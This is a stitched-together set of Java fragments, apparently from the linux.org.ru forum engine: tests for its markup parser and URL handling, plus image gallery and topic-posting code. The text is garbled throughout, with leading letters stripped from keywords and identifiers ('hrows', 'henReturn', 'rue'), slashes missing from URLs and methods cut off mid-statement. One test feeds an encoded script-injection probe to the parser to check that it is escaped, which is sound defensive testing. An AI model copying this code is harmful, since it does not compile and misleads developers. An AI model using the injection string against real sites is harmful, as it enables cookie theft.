public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , oLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , oLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , oLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , oLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a, true) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , oLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , oLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
public void est1 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est1n ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est2 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est3 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est4 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url4 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est5 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url5 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est6 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url6 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void est7 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url7 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , canon ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void est12 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est14 ( ) hrows Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , canon ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , canon ) ) ; } 
public void est15 ( ) hrows Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , canon ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , canon ) ) ; } 
public void initTest ( ) hrows Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . henReturn ( false ) ; when ( splinter . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . henReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . henReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . henReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getSecureURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void estExtraLines ( ) { user assertEquals(lorCodeService.parseComment("[user]splinter[/user]", false), lorCodeService.parseComment("[user]splinter[/user]", false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a> <span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false)); 
public void userTest ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false ) ) ; 
public void userTest2 ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false ) ) ; 
public void brTest ( ) { assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false ) ) ; } 
public void boldTest ( ) { assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false ) ) ; } 
public void italicTest ( ) { assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false ) ) ; } 
public void strikeoutTest ( ) { assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false ) ) ; } 
public void emphasisTest ( ) { assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false ) ) ; } 
public void quoteTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false ) ) ; } 
public void urlTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false ) ) ; 
public void paragraphSpacesTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a> <a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] [url]http:linux.org.ru[/url] " , false ) ) ; 
public void urlParamTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false ) ) ; } 
public void urlParamWithTagTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false ) ) ; } 
public void listTest ( ) { assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void overflow1Test ( ) { assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false ) ) ; 
public void spacesTest ( ) { assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false ) ) ; 
public void cut4Test ( ) { assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , lorCodeService . parseTopic ( " [cut] ntest[/cut][cut]test[/cut] " , false ) ) ; 
public void escapeDoubleBrackets ( ) { assertEquals ( " <p>[[doNotTag]]</p> " , lorCodeService . parseComment ( " [[doNotTag]] " , false ) ) ; assertEquals ( " <p>[[/doNotTag]]</p> " , lorCodeService . parseComment ( " [[/doNotTag]] " , false ) ) ; assertEquals ( " <p>[b]</p> " , lorCodeService . parseComment ( " [[b]] " , false ) ) ; assertEquals ( " <p>[/b]</p> " , lorCodeService . parseComment ( " [[/b]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[doNotTag]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/doNotTag]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/doNotTag]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[b]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/b]][/code] " , false ) ) ; assertEquals ( " <p>[[[doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[doNotTag]]] " , false ) ) ; assertEquals ( " <p>[[[/doNotTag]]]</p> " , lorCodeService . parseComment ( " [[[/doNotTag]]] " , false ) ) ; assertEquals ( " <p>[[b]]</p> " , lorCodeService . parseComment ( " [[[b]]] " , false ) ) ; assertEquals ( " <p>[[/b]]</p> " , lorCodeService . parseComment ( " [[[/b]]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[b]][/code][[b]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/b]]</code></pre></div><p>[b]</p> " , lorCodeService . parseComment ( " [code][[/b]][/code][[b]] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[code]][/code] " , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[[/code]]</code></pre></div> " , lorCodeService . parseComment ( " [code][[/code]][/code] " , false ) ) ; 
public void urlTest0 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false ) ) ; 
public void urlTest1 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false ) ) ; 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false)); 
public void estHighlightURL ( ) { assertEquals ( " <p><a href= \" http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E \" >http:ya.ru/?a=f&lt;script&gt;alert('i have cookies!')&lt;/script&gt;</a></p> " , lorCodeService . parseComment ( " http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E " , false ) ) ; } 
public TcpClient elasticsearch ( ) { Client mockClient = mock ( Client . class ) ; Mockito . when ( mockClient . prepareSearch ( Matchers . anyString ( ) ) ) . henThrow ( new ElasticsearchException ( " no ES here " ) ) ; return TcpClient$ . MODULE$ . fromClient ( mockClient ) ; } 
public Image imageForTopic ( @Nonnull Topic opic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, extension FROM images WHERE topic=? AND NOT deleted " , new ImageRowMapper ( ) , opic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public int saveImage ( int opicId , String extension ) { ImmutableMap < String , ? > dataMap = ImmutableMap . of ( " opic " , opicId , " extension " , extension ) ; return jdbcInsert . executeAndReturnKey ( dataMap ) . intValue ( ) ; } 
public Image mapRow ( ResultSet rs , int i ) hrows SQLException { int imageid = rs . getInt ( " id " ) ; return new Image ( imageid , 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; int imageid = rs . getInt ( " imageid " ) ; Image image = new Image ( imageid , rs . getInt ( " msgid " ) , " images/ " + imageid + " /original. " + rs . getString ( " extension " ) , " images/ " + imageid + " /200px.jpg " ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public void moveTo ( File dir , String name ) hrows IOException { File arget = Files . createDirectory ( new File ( dir , name ) . oPath ( ) ) . oFile ( ) ; Files . move ( mainFile . oPath ( ) , new File ( arget , " original. " + extension ) . oPath ( ) ) ; Files . move ( iconFile . oPath ( ) , new File ( arget , Image . IconWidth ( ) + " px. " + extension ) . oPath ( ) ) ; Files . move ( mediumFile . oPath ( ) , new File ( arget , Image . MediumWidth ( ) + " px. " + extension ) . oPath ( ) ) ; Files . move ( medium2xFile . oPath ( ) , new File ( arget , Image . Medium2xWidth ( ) + " px. " + extension ) . oPath ( ) ) ; } 
void doResize ( File uploadedFile ) hrows IOException , BadImageException { Files . move ( uploadedFile . oPath ( ) , mainFile . oPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = rue ; ry { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , Image . IconWidth ( ) ) ; 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , String message , UploadedImagePreview scrn , Topic previewMsg ) hrows IOException , ScriptErrorException { session . removeAttribute ( " image " ) ; int msgid = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; } params . put ( " moderated " , section . isPremoderated ( ) ) ; params . put ( " url " , messageUrl ) ; return new ModelAndView ( " add-done-moderated " , params ) ; } 
public void moveTo ( File dir , String name ) hrows IOException { File arget = Files . createDirectory ( new File ( dir , name ) . oPath ( ) ) . oFile ( ) ; Files . move ( mainFile . oPath ( ) , new File ( arget , " original. " + extension ) . oPath ( ) ) ; Files . move ( iconFile . oPath ( ) , new File ( arget , Image . IconWidth ( ) + " px.jpg " ) . oPath ( ) ) ; Files . move ( mediumFile . oPath ( ) , new File ( arget , Image . MediumWidth ( ) + " px.jpg " ) . oPath ( ) ) ; Files . move ( medium2xFile . oPath ( ) , new File ( arget , Image . Medium2xWidth ( ) + " px.jpg " ) . oPath ( ) ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; int imageid = rs . getInt ( " imageid " ) ; Image image = new Image ( imageid , rs . getInt ( " msgid " ) , " images/ " + imageid + " /original. " + rs . getString ( " extension " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public void moveTo ( File dir , String name ) hrows IOException { File arget = Files . createDirectory ( new File ( dir , name ) . oPath ( ) ) . oFile ( ) ; Files . move ( mainFile . oPath ( ) , new File ( arget , " original. " + extension ) . oPath ( ) ) ; Files . move ( mediumFile . oPath ( ) , new File ( arget , Image . MediumWidth ( ) + " px.jpg " ) . oPath ( ) ) ; Files . move ( medium2xFile . oPath ( ) , new File ( arget , Image . Medium2xWidth ( ) + " px.jpg " ) . oPath ( ) ) ; } 
void doResize ( File uploadedFile ) hrows IOException , BadImageException { Files . move ( uploadedFile . oPath ( ) , mainFile . oPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = rue ; ry { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , mediumFile . getAbsolutePath ( ) , Image . MediumWidth ( ) ) ; 
